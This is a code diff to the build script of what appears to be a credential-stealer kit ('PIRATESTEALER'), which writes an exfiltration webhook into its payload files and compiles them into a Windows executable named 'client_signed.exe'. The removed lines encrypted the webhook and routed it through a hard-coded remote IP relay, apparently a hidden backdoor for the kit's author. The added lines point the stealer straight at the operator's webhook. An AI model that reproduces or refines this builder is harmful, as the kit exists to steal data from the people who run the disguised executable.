@@ -66,34 +66,15 @@ if (args.length != 3) {
     return;
 }
 
-const key = "stanleySMODSPIRATESTEALER0109222";
-const crypto = require('crypto');
-
-function encrypt(plainText) {
-    const iv = crypto.randomBytes(16);
-    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
-    let cipherText;
-    try {
-        cipherText = cipher.update(plainText, 'utf8', 'hex');
-        cipherText += cipher.final('hex');
-        cipherText = iv.toString('hex') + cipherText;
-    } catch (e) {
-        cipherText = null;
-    }
-    return cipherText;
-}
-
 async function start() {
-    const encryptedWebhook = "http://2.58.56.42:2086/webhooks/" + encrypt(args[1]);
-    console.log(encryptedWebhook);
 
-    fs.writeFileSync("index.js", fs.readFileSync("index.js").toString().replace("%WEBHOOK%", encryptedWebhook));
-    fs.writeFileSync("./utils/injection.js", fs.readFileSync("./utils/injection.js").toString().replace("%WEBHOOK%", encryptedWebhook));
+    fs.writeFileSync("index.js", fs.readFileSync("index.js").toString().replace("%WEBHOOK%", args[1]));
+    fs.writeFileSync("./utils/injection.js", fs.readFileSync("./utils/injection.js").toString().replace("%WEBHOOK%", args[1]));
 
     await exec(`pkg -C GZip -o client_signed.exe -t node18-win-x64 .`);
 
-    fs.writeFileSync("index.js", fs.readFileSync("index.js").toString().replace(encryptedWebhook, "%WEBHOOK%"));
-    fs.writeFileSync("./utils/injection.js", fs.readFileSync("./utils/injection.js").toString().replace(encryptedWebhook, "%WEBHOOK%"));
+    fs.writeFileSync("index.js", fs.readFileSync("index.js").toString().replace(args[1], "%WEBHOOK%"));
+    fs.writeFileSync("./utils/injection.js", fs.readFileSync("./utils/injection.js").toString().replace(args[1], "%WEBHOOK%"));
     fs.renameSync("client_signed.exe", args[2] + ".exe");
 
     const output = fs.createWriteStream(__dirname + '/' + args[2] + '.zip');
